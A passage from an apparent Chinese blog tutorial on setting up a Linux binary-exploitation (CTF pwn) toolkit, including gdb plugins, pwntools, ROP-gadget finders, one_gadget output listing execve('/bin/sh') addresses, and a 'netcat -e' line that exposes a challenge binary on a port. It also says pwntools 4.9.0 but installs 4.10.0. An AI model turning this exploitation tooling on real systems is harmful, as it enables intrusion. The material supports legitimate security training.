<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/zsh-users/zsh-autosuggestions <span class="variable">$&#123;ZSH_CUSTOM:-~/.oh-my-zsh/custom&#125;</span>/plugins/zsh-autosuggestions</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/zsh-users/zsh-syntax-highlighting.git <span class="variable">$&#123;ZSH_CUSTOM:-~/.oh-my-zsh/custom&#125;</span>/plugins/zsh-syntax-highlighting</span><br></pre></td></tr></table></figure></div>
<p>编辑 <code>~/.zshrc</code> 添加插件：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">plugins=( </span><br><span class="line">    <span class="comment"># other plugins...</span></span><br><span class="line">    zsh-autosuggestions</span><br><span class="line">    zsh-syntax-highlighting</span><br><span class="line">    extract</span><br><span class="line">)</span><br></pre></td></tr></table></figure></div>
<p>更新：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">omz update</span><br></pre></td></tr></table></figure></div>
<h2 id="pwn-相关工具"><a href="#pwn-相关工具" class="headerlink" title="pwn 相关工具"></a>pwn 相关工具</h2><h3 id="clion"><a href="#clion" class="headerlink" title="clion"></a>clion</h3><p><a class="link"   href="https://www.jetbrains.com/clion/download/#section=linux" >clion <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 是一款 C\C++ 的 IDE ，可以用来阅读 glibc 源码的工具，这款工具对<strong>宏展开</strong>，<strong>符号跳转</strong>，<strong>结构体大小以及成员偏移计算</strong>都有很好的支持。这款软件需要付费使用，不过可以某宝搞一个教育邮箱。</p>
<p>首先用打开 <a class="link"   href="https://gitcode.net/qq_45323960/debug_glibc" >debug_glibc <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 解压后的 glibc  源码，这里有以下几点需要注意：</p>
<ul>
<li>源码在对应版本的 <code>source</code> 目录下。</li>
<li>最好不要使用解压到默认 <code>\glibc</code> 路径下的源码，因为源码调试与行号绑定，阅读源码可能会修改到源码。</li>
<li>这里用 <code>debug_glibc</code> 中的源码是因为这里的源码是编译过的，clion 分析代码需要编译的配置文件。</li>
</ul>
<p>然后这里我们看到 Makefile 没有正确导入：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/07/linux-user-pwn-basic-knowlege/images/image-20241107232611195.png"
                      alt="image-20241107232611195"
                ><br>在较新版本的 clion 中位于 <code>source</code> 根目录下的 <code>autoreconf</code> 的配置文件 <code>configure.ac</code> 配置有问题，需要改成以下内容（这个主要看版本，有时默认的就好使)：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">GLIBC_PROVIDES dnl See aclocal.m4 <span class="keyword">in</span> the top level <span class="built_in">source</span> directory.</span><br><span class="line"><span class="comment"># Local configure fragment for sysdeps/i386.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># We no longer support i386 since it lacks the atomic instructions</span></span><br><span class="line"><span class="comment"># required to implement NPTL threading.</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">test</span> <span class="string">&quot;<span class="variable">$config_machine</span>&quot;</span> = i386; <span class="keyword">then</span></span><br><span class="line">  AC_MSG_ERROR([</span><br><span class="line">*** ERROR: Support <span class="keyword">for</span> i386 is deprecated.</span><br><span class="line">*** Please use host i786, i686, i585 or i486.</span><br><span class="line">*** For example: /src/glibc/configure --host=i686-pc-linux-gnu ...<span class="string">&quot;])</span></span><br><span class="line"><span class="string">fi</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># The GNU C Library can&#x27;t be built for i386.  There are several reasons for</span></span><br><span class="line"><span class="string"># this restriction.  The primary reason is that i386 lacks the atomic</span></span><br><span class="line"><span class="string"># operations required to support the current NPTL implementation.  While it is</span></span><br><span class="line"><span class="string"># possible that such atomic operations could be emulated in the kernel to date</span></span><br><span class="line"><span class="string"># no such work has been done to enable this.  Even with NPTL disabled you still</span></span><br><span class="line"><span class="string"># have no atomic.h implementation.  Given the declining use of i386 we disable</span></span><br><span class="line"><span class="string"># support for building with `-march=i386&#x27; or `-mcpu=i386.&#x27; We don&#x27;t explicitly</span></span><br><span class="line"><span class="string"># check for i386, instead we make sure the compiler has support for inlining</span></span><br><span class="line"><span class="string"># the builtin __sync_val_compare_and_swap. If it does then we should have no</span></span><br><span class="line"><span class="string"># problem building for i386.</span></span><br><span class="line"><span class="string">LIBC_COMPILER_BUILTIN_INLINED(</span></span><br><span class="line"><span class="string">  [__sync_val_compare_and_swap],</span></span><br><span class="line"><span class="string">  [int a, b, c; __sync_val_compare_and_swap (&amp;a, b, c);],</span></span><br><span class="line"><span class="string">  [-O0],</span></span><br><span class="line"><span class="string">  [libc_cv_unsupported_i386=no],</span></span><br><span class="line"><span class="string">  [AC_MSG_ERROR([</span></span><br><span class="line"><span class="string">*** Building with -march=i386/-mcpu=i386 is not supported.</span></span><br><span class="line"><span class="string">*** Please use host i786, i686, i586, or i486.</span></span><br><span class="line"><span class="string">*** For example: /source/glibc/configure CFLAGS=&#x27;-O2 -march=i686&#x27; ...])])</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">dnl Check whether asm supports Intel MPX</span></span><br><span class="line"><span class="string">AC_CACHE_CHECK(for Intel MPX support, libc_cv_asm_mpx, [dnl</span></span><br><span class="line"><span class="string">cat &gt; conftest.s &lt;&lt;\EOF</span></span><br><span class="line"><span class="string">        bndmov %bnd0,(%esp)</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"><span class="string">if AC_TRY_COMMAND(<span class="variable">$&#123;CC-cc&#125;</span> -c <span class="variable">$ASFLAGS</span> conftest.s 1&gt;&amp;AS_MESSAGE_LOG_FD); then</span></span><br><span class="line"><span class="string">  libc_cv_asm_mpx=yes</span></span><br><span class="line"><span class="string">else</span></span><br><span class="line"><span class="string">  libc_cv_asm_mpx=no</span></span><br><span class="line"><span class="string">fi</span></span><br><span class="line"><span class="string">rm -f conftest*])</span></span><br><span class="line"><span class="string">if test <span class="variable">$libc_cv_asm_mpx</span> == yes; then</span></span><br><span class="line"><span class="string">  AC_DEFINE(HAVE_MPX_SUPPORT)</span></span><br><span class="line"><span class="string">fi</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">AC_DEFINE(USE_REGPARMS)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">dnl It is always possible to access static and hidden symbols in an</span></span><br><span class="line"><span class="string">dnl position independent way.</span></span><br><span class="line"><span class="string">AC_DEFINE(PI_STATIC_AND_HIDDEN)</span></span><br></pre></td></tr></table></figure></div>
<p>另外还需要右键 Makefile 设置在命令后面添加 <code>--disable-sanity-checks</code> 。另外构建目标要填 <code>all</code> ，否则 clion 分析的源码的不全。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/07/linux-user-pwn-basic-knowlege/images/image-20241107232825793.png"
                      alt="image-20241107232825793"
                ><br>完整预配置命令如下：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># GNU Autotools template, feel free to customize.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="built_in">which</span> autoreconf &gt;/dev/null &amp;&amp; autoreconf --install --force --verbose <span class="string">&quot;<span class="variable">$&#123;PROJECT_DIR:-..&#125;</span>&quot;</span> 2&gt;&amp;1; /bin/sh <span class="string">&quot;<span class="variable">$&#123;PROJECT_DIR:-..&#125;</span>/configure&quot;</span> --disable-sanity-checks</span><br></pre></td></tr></table></figure></div>
<p>之后右键重新加载 Makefile 项目。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/07/linux-user-pwn-basic-knowlege/images/image-20241107232847285.png"
                      alt="image-20241107232847285"
                ><br>不勾选清理项目。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/07/linux-user-pwn-basic-knowlege/images/image-20241107232907035.png"
                      alt="image-20241107232907035"
                ><br>如果最后这样说明导入成功，之后耐心等待项目导入完毕即可。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/07/linux-user-pwn-basic-knowlege/images/image-20241107232925754.png"
                      alt="image-20241107232925754"
                ></p>
<h3 id="gdb"><a href="#gdb" class="headerlink" title="gdb"></a>gdb</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt-get install gdb gdb-multiarch</span><br></pre></td></tr></table></figure></div>
<h3 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h3><p>注意我这里的 pwntools 是 python2 版本的，需要指定为 4.9.0 ，因为高版本的 pwntools 已经不支持 python2 了（具体来说是高版本的 pwntools 必须依赖 unicorn 2.x.x ，而 unicorn 2.x.x 只支持 python3）。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">pip install pwntools==4.10.0 -i https://pypi.tuna.tsinghua.edu.cn/simple </span><br></pre></td></tr></table></figure></div>
<p>如果已经装了 pwntools 需要先卸载干净再重新安装，否则更改版本无效（最好不带 <code>sudo</code> 也来一遍确保卸载干净）。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> pip2 uninstall pwntools</span><br><span class="line"><span class="built_in">sudo</span> pip2 uninstall unicorn</span><br></pre></td></tr></table></figure></div>
<p>这样安装的 pwntools 的 plt 功可能无法正常使用，需要手动安装 Unicorn 库。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">pip install unicorn==1.0.3 -i https://pypi.tuna.tsinghua.edu.cn/simple</span><br></pre></td></tr></table></figure></div>
<p>当然这样做的代价是一些特殊架构老版本的 pwntools 不支持，这时候最好换 python3 的 pwntools 。</p>
<h3 id="gdb-插件"><a href="#gdb-插件" class="headerlink" title="gdb 插件"></a>gdb 插件</h3><p>主要有 pwndbg，peda，gef ，这里我常用的是 pwndbg 。对于一些版本过于古老导致环境装不上的可以尝试一下 peda 。</p>
<p>先将三个项目的代码都拉取下来。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/longld/peda.git</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/pwndbg/pwndbg.git</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/hugsy/gef.git</span><br></pre></td></tr></table></figure></div>
<p>pwndbg 需要运行初始化脚本。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> pwndbg</span><br><span class="line"><span class="built_in">sudo</span> ./setup.sh</span><br></pre></td></tr></table></figure></div>
<p>另外还有一个 pwngdb 插件在调试多线程堆（<code>heapinfoall</code> 命令）的时候很有用，建议安装。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/scwuaptx/Pwngdb.git </span><br></pre></td></tr></table></figure></div>
<p>gdb 在启动的时候会读取当前用户的主目录的 <code>.gdbinit</code> 文件进行 gdb 插件的初始化，这里提供一个配置方案。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">source</span> /home/sky123/tools/pwndbg/gdbinit.py </span><br><span class="line"><span class="comment">#source /home/sky123/tools/peda/peda.py</span></span><br><span class="line"><span class="comment">#source /home/sky123/tools/gef/gef.py</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#source /home/sky123/tools/muslheap/muslheap.py</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">source</span> /home/sky123/tools/Pwngdb/pwngdb.py</span><br><span class="line"><span class="built_in">source</span> /home/sky123/tools/Pwngdb/angelheap/gdbinit.py</span><br><span class="line"></span><br><span class="line">define hook-run</span><br><span class="line">python</span><br><span class="line">import angelheap</span><br><span class="line">angelheap.init_angelheap()</span><br><span class="line">end</span><br><span class="line">end</span><br></pre></td></tr></table></figure></div>

  <div class="note-large red">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>注意</p>

    </div>
    <div class="notel-content">
      <ul>
<li>以普通用权限和管理员权限启动 gdb 时读取的 <code>.gdbinit</code> 文件的路径是不同的，普通权限读取的是 <code>/home/&lt;username&gt;/.gdbinit</code> 而管理员权限读取的是 <code>/root/.gdbinit</code> 。</li>
<li>上述配置方案是为了使用 <code>Pwngdb</code> 插件，而该插件唯一的作用就是打印每个线程的对应的 <code>tcache</code>，而实际上这个库已经很久不维护了，因此建议还是直接 <code>source /home/sky123/tools/pwndbg/gdbinit.py</code>。</li>
</ul>

    </div>
  </div>

<p>pwndbg 安装 ghidra 插件可以支持代码反编译（<del>虽然没啥用</del> ）</p>
<ul>
<li>安装 <code>r2pipe</code> 库  <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">pip3 install r2pipe</span><br></pre></td></tr></table></figure></div></li>
<li>下载安装 radere2 项目  <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/radareorg/radare2.git</span><br><span class="line"><span class="built_in">cd</span> radare2</span><br><span class="line"><span class="built_in">sudo</span> sys/install.sh</span><br></pre></td></tr></table></figure></div></li>
<li>下载编译安装 r2ghidra 项目  <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/radareorg/r2ghidra.git</span><br><span class="line"><span class="built_in">cd</span> r2ghidra</span><br><span class="line"><span class="built_in">sudo</span> ./preconfigure</span><br><span class="line"><span class="built_in">sudo</span> ./configure</span><br><span class="line"><span class="built_in">sudo</span> make -j16</span><br><span class="line"><span class="built_in">sudo</span> make install</span><br></pre></td></tr></table></figure></div></li>
</ul>
<h3 id="gadget-搜索工具"><a href="#gadget-搜索工具" class="headerlink" title="gadget 搜索工具"></a>gadget 搜索工具</h3><h4 id="ROPgdbget"><a href="#ROPgdbget" class="headerlink" title="ROPgdbget"></a>ROPgdbget</h4><p>安装：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/JonathanSalwan/ROPgadget.git</span><br><span class="line"><span class="built_in">cd</span> ROPgadget</span><br><span class="line"><span class="built_in">sudo</span> python3 setup.py install</span><br></pre></td></tr></table></figure></div>
<p>使用：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary ntdll.dll &gt; rop</span><br></pre></td></tr></table></figure></div>
<p>有时候 <code>ROPgadget</code> 会出现如下报错：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary init_60D_fwf &gt; rop</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;/usr/local/bin/ROPgadget&quot;</span>, line 12, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    ropgadget.main()</span><br><span class="line">  File <span class="string">&quot;/home/sky123/.local/lib/python3.10/site-packages/ropgadget/__init__.py&quot;</span>, line 30, <span class="keyword">in</span> main</span><br><span class="line">    sys.exit(0 <span class="keyword">if</span> Core(args.getArgs()).analyze() <span class="keyword">else</span> 1)</span><br><span class="line">  File <span class="string">&quot;/home/sky123/.local/lib/python3.10/site-packages/ropgadget/core.py&quot;</span>, line 257, <span class="keyword">in</span> analyze</span><br><span class="line">    self.__getGadgets()</span><br><span class="line">  File <span class="string">&quot;/home/sky123/.local/lib/python3.10/site-packages/ropgadget/core.py&quot;</span>, line 70, <span class="keyword">in</span> __getGadgets</span><br><span class="line">    G = Gadgets(self.__binary, self.__options, self.__offset)</span><br><span class="line">  File <span class="string">&quot;/home/sky123/.local/lib/python3.10/site-packages/ropgadget/gadgets.py&quot;</span>, line 24, <span class="keyword">in</span> __init__</span><br><span class="line">    <span class="keyword">elif</span> self.__arch == CS_ARCH_ARM64:</span><br><span class="line">NameError: name <span class="string">&#x27;CS_ARCH_ARM64&#x27;</span> is not defined. Did you mean: <span class="string">&#x27;CS_ARCH_ARM&#x27;</span>?</span><br></pre></td></tr></table></figure></div>

<p>此时需要重新安装 <code>capstone</code>：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> pip uninstall capstone</span><br><span class="line"><span class="built_in">sudo</span> pip install capstone</span><br></pre></td></tr></table></figure></div>

<h4 id="ropper"><a href="#ropper" class="headerlink" title="ropper"></a>ropper</h4><ul>
<li>安装：<ul>
<li>在 pypi 的 <a class="link"   href="https://pypi.org/project/ropper/#files" >ropper 官网 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>上下载 ropper</li>
<li>运行安装脚本完成 ropper 安装  <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> python3 setup.py install</span><br></pre></td></tr></table></figure></div></li>
</ul>
</li>
<li>使用：  <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">ropper --file ./pwn --nocolor &gt; rop</span><br></pre></td></tr></table></figure></div></li>
</ul>
<h4 id="one-gadget"><a href="#one-gadget" class="headerlink" title="one_gadget"></a>one_gadget</h4><p>用于搜索 libc 中能够实现 <code>execve(&quot;/bin/sh&quot;, (char *[2]) &#123;&quot;/bin/sh&quot;, NULL&#125;, NULL);</code> 的效果的跳转地址，由于是采用特征匹配的方法，因此只能是在 libc 中查找。</p>
<ul>
<li><p>安装：</p>
  <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install -y ruby ruby-dev</span><br><span class="line"><span class="built_in">sudo</span> gem install one_gadget</span><br></pre></td></tr></table></figure></div></li>
<li><p>使用：可以查找到 gadget 地址以及条件限制。</p>
  <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">➜  ~ one_gadget /lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line">0x50a37 posix_spawn(rsp+0x1c, <span class="string">&quot;/bin/sh&quot;</span>, 0, rbp, rsp+0x60, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rsp &amp; 0xf == 0</span><br><span class="line">  rcx == NULL</span><br><span class="line">  rbp == NULL || (u16)[rbp] == NULL</span><br><span class="line"></span><br><span class="line">0xebcf1 execve(<span class="string">&quot;/bin/sh&quot;</span>, r10, [rbp-0x70])</span><br><span class="line">constraints:</span><br><span class="line">  address rbp-0x78 is writable</span><br><span class="line">  [r10] == NULL || r10 == NULL</span><br><span class="line">  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL</span><br><span class="line"></span><br><span class="line">0xebcf5 execve(<span class="string">&quot;/bin/sh&quot;</span>, r10, rdx)</span><br><span class="line">constraints:</span><br><span class="line">  address rbp-0x78 is writable</span><br><span class="line">  [r10] == NULL || r10 == NULL</span><br><span class="line">  [rdx] == NULL || rdx == NULL</span><br><span class="line"></span><br><span class="line">0xebcf8 execve(<span class="string">&quot;/bin/sh&quot;</span>, rsi, rdx)</span><br><span class="line">constraints:</span><br><span class="line">  address rbp-0x78 is writable</span><br><span class="line">  [rsi] == NULL || rsi == NULL</span><br><span class="line">  [rdx] == NULL || rdx == NULL</span><br></pre></td></tr></table></figure></div>
<p>  如果 <code>one_gadget</code> 在一个版本的 Ubuntu 中搜索某一版本的 glibc 的 gadget 出现如下报错可以尝试换另一个版本的 Ubuntu 。貌似是权限问题，可以以 root 权限重新装一下。</p>
<p>  <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/07/linux-user-pwn-basic-knowlege/images/image-20241107233247289.png"
                      alt="image-20241107233247289"
                ></p>
</li>
</ul>
<h3 id="seccomp-tools"><a href="#seccomp-tools" class="headerlink" title="seccomp-tools"></a>seccomp-tools</h3><p>用于查看和生成程序沙箱规则。</p>
<ul>
<li>安装：  <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> gem install seccomp-tools</span><br></pre></td></tr></table></figure></div></li>
<li>使用：  <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">seccomp-tools dump ./pwn</span><br></pre></td></tr></table></figure></div></li>
</ul>
<h3 id="LibcSearcher"><a href="#LibcSearcher" class="headerlink" title="LibcSearcher"></a>LibcSearcher</h3><p>通过泄露的 libc 中函数的地址来确定 libc 版本。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/lieanu/LibcSearcher.git</span><br><span class="line"><span class="built_in">cd</span> LibcSearcher</span><br><span class="line"><span class="built_in">sudo</span> python3 setup.py install</span><br></pre></td></tr></table></figure></div>
<h3 id="glibc-all-in-one"><a href="#glibc-all-in-one" class="headerlink" title="glibc-all-in-one"></a>glibc-all-in-one</h3><p>临时找 glibc 和 ld 或者编译 glibc 。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/matrix1001/glibc-all-in-one.git</span><br></pre></td></tr></table></figure></div>
<p>更新下载列表：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">➜  glibc-all-in-one ./update_list</span><br><span class="line">[+] Common list has been save to <span class="string">&quot;list&quot;</span></span><br><span class="line">[+] Old-release list has been save to <span class="string">&quot;old_list&quot;</span></span><br><span class="line"></span><br><span class="line">➜  glibc-all-in-one <span class="built_in">cat</span> list</span><br><span class="line">2.23-0ubuntu10_amd64</span><br><span class="line">2.23-0ubuntu10_i386</span><br><span class="line">2.23-0ubuntu11_amd64</span><br><span class="line">2.23-0ubuntu11_i386</span><br><span class="line">2.23-0ubuntu3_amd64</span><br><span class="line">2.23-0ubuntu3_i386</span><br><span class="line">2.27-3ubuntu1_amd64</span><br><span class="line">2.27-3ubuntu1_i386</span><br><span class="line">2.28-0ubuntu1_amd64</span><br><span class="line">2.28-0ubuntu1_i386</span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">➜  glibc-all-in-one <span class="built_in">cat</span> old_list</span><br><span class="line">2.21-0ubuntu4.3_amd64</span><br><span class="line">2.21-0ubuntu4.3_amd64</span><br><span class="line">2.21-0ubuntu4_amd64</span><br><span class="line">2.21-0ubuntu4_amd64</span><br><span class="line">2.24-3ubuntu1_amd64</span><br><span class="line">2.24-3ubuntu1_amd64</span><br><span class="line">2.24-3ubuntu2.2_amd64</span><br><span class="line">2.24-3ubuntu2.2_amd64</span><br><span class="line">2.24-9ubuntu2.2_amd64</span><br><span class="line">2.24-9ubuntu2.2_amd64</span><br><span class="line">......</span><br></pre></td></tr></table></figure></div>
<p>下载 libc ，注意要安装解压工具 <code>zstd</code> ，因为下载脚本中用到了。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt-get install zstd</span><br><span class="line"><span class="built_in">cat</span> list |xargs -i ./download &#123;&#125;</span><br><span class="line"><span class="built_in">cat</span> old_list |xargs -i ./download_old &#123;&#125;</span><br></pre></td></tr></table></figure></div>
<p>编译 libc</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> ./build [版本例如2.29] [架构例如 i686 amd64]</span><br></pre></td></tr></table></figure></div>

<h3 id="patchelf"><a href="#patchelf" class="headerlink" title="patchelf"></a>patchelf</h3><p>安装：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt install patchelf</span><br></pre></td></tr></table></figure></div>
<h3 id="qemu"><a href="#qemu" class="headerlink" title="qemu"></a>qemu</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install qemu-user qemu-system </span><br></pre></td></tr></table></figure></div>
<h1 id="如何使用题目提供的-docker-环境"><a href="#如何使用题目提供的-docker-环境" class="headerlink" title="如何使用题目提供的 docker 环境"></a>如何使用题目提供的 docker 环境</h1><h2 id="netcat"><a href="#netcat" class="headerlink" title="netcat"></a>netcat</h2><p>在<a class="link"   href="https://netcat.sourceforge.net/" >官网 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>下载项目源码，使用如下命令进行编译。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">./configure LDFLAGS=-static <span class="comment"># 考虑到 docker 环境恶劣选择静态编译</span></span><br><span class="line">make -j24 <span class="comment"># 编译</span></span><br></pre></td></tr></table></figure></div>
<p>编译后生成的 <code>netcat</code> 位于项目 <code>src</code> 目录下。<code>netcat</code> 即我们常用的 <code>nc</code> 命令对应的可执行程序。</p>
<p>在 docker 中使用如下命令将题目 io 映射到 8888 端口。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">./netcat -lvp 8888 -e ./pwn</span><br></pre></td></tr></table></figure></div>

<p>在本机可以使用如下命令连接并交互。（前提是 docker 的 8888 端口映射到本机的 8888 端口）</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">nc 127.0.0.1 8888</span><br></pre></td></tr></table></figure></div>
<h2 id="gdb-1"><a href="#gdb-1" class="headerlink" title="gdb"></a>gdb</h2><p>在<a class="link"   href="https://www.sourceware.org/gdb/download/" >官网 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>下载项目源码，使用如下命令编译 gdbserver ：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt-get install libgmp-dev libmpfr-dev</span><br><span class="line"><span class="built_in">cd</span> gdb-9.2/gdb/gdbserver</span><br><span class="line">./configure LDFLAGS=-static</span><br><span class="line">make -j $(<span class="built_in">nproc</span>)</span><br></pre></td></tr></table></figure></div>
<p>对于 gdb ，由于编译 gdb 时依赖的静态库需要提前编译，因此想要编译 gdb 最好直接编译整个项目：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> gdb-9.2</span><br><span class="line"><span class="built_in">mkdir</span> build</span><br><span class="line"><span class="built_in">cd</span> build</span><br><span class="line">../configure   LDFLAGS=-static</span><br><span class="line">make -j $(<span class="built_in">nproc</span>)</span><br></pre></td></tr></table></figure></div>

<p>注意以下几点：</p>
<ul>
<li>编译的 <code>gdbserver</code> 版本一定要与本机的 <code>gdb</code> 匹配，不同版本的 <code>gdbserver</code> 通信协议不同。</li>
<li>有的时候在 <code>gdbserver</code> 中运行 <code>./configuer</code> 命令会出现找不到 <code>Makefile</code> 的情况，这时在根目录进行一次编译就好了。</li>
<li>连接失败之后再运行一次编译命令就可能编译成功。</li>
<li><code>gdb</code> 位于 <code>./gdb/gdb</code> 中。</li>
<li><code>gdbserver</code> 位于 <code>./gdbserver/gdbserver</code> 中。</li>
</ul>
<h2 id="docker-1"><a href="#docker-1" class="headerlink" title="docker"></a>docker</h2><ul>
<li>加载镜像  <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">docker load -i 题目附件.tar</span><br></pre></td></tr></table></figure></div></li>
<li>查看现有镜像  <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure></div></li>
<li>启动容器  <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">docker run --privileged -it -w /home/ctf -v ~/Desktop/本机目录:/home/ctf/镜像目录 -p 8888:8888 -p 9999:9999 镜像名 /bin/bash </span><br></pre></td></tr></table></figure></div>
<ul>
<li><code>--privileged</code>：加这个参数才能 <code>gdbserver</code> 附加进程远程调试</li>
<li><code>-v</code>：目录映射，方便传文件。</li>
<li><code>-p</code>：端口映射，开两个端口分别给 <code>netcat</code> 和 <code>gdbserver</code> 用。改用 <code>--net=host</code> 可以映射全部端口。</li>
<li><code>-w</code>：进入 docker 后目录为 <code>/home/ctf</code> 。</li>
</ul>
</li>
<li>查看现有容器   <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">docker ps</span><br></pre></td></tr></table></figure></div></li>
